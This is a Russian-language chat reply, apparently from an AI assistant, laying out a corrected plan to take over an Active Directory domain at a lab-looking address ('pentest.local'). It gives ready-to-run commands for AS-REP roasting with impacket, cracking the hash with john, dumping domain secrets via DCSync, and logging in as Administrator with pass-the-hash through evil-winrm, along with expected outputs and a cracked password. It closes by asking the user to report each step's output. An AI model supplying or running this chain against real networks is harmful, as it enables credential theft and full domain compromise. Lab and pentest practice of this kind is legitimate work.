Ты абсолютно прав. Вот **исправленный план** с правильной документацией:

---

## ⚡ Сначала — создаём файл юзеров:

```bash
cat > users.txt << 'EOF'
svc_backupagent
alice.johnson
carol.white
Administrator
krbtgt
EOF
```

> Без `-usersfile` скрипт пытается перечислить юзеров через LDAP, а для этого нужны creds или null session. С файлом — работает без пароля [[16]].

---

## ⚡ ПЛАН (проверенный синтаксис):

```bash
DC=192.168.56.102
```

### ШАГ 1 — Разведка
```bash
nmap -p 88,389,445,5985 $DC --open
```

### ШАГ 2 — AS-REP Roasting [[13]][[16]]
```bash
impacket-GetNPUsers pentest.local/ -dc-ip $DC -usersfile users.txt -no-pass -format john -outputfile asrep.txt
```

Посмотреть результат:
```bash
cat asrep.txt
```

Ожидаемый вывод:
```
$krb5asrep$23$svc_backupagent@PENTEST.LOCAL:...
```

### ШАГ 3 — Взлом хеша
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt
john --show asrep.txt
```

Результат: `svc_backupagent:Welcome2024!`

### ШАГ 4 — DCSync
```bash
impacket-secretsdump pentest.local/svc_backupagent:'Welcome2024!'@$DC
```

Ищем: `Administrator:500:...:<NTLM_HASH>`

### ШАГ 5 — Вход как DA
```bash
evil-winrm -i $DC -u Administrator -H <NTLM_HASH_ИЗ_ШАГА_4>
```

```powershell
whoami
net user /domain
```

---

### 📋 Почему нужен `-usersfile`:

| Без `-usersfile` | С `-usersfile` |
|------------------|----------------|
| Нужны creds или null session для LDAP enum | Работает без пароля |
| Пытается query LDAP автоматически | Тестирует каждый юзер из файла напрямую через Kerberos |
| Может упасть если RPC закрыт | Всегда работает если порт 88 открыт |

Выполняй и скидывай вывод каждого шага.
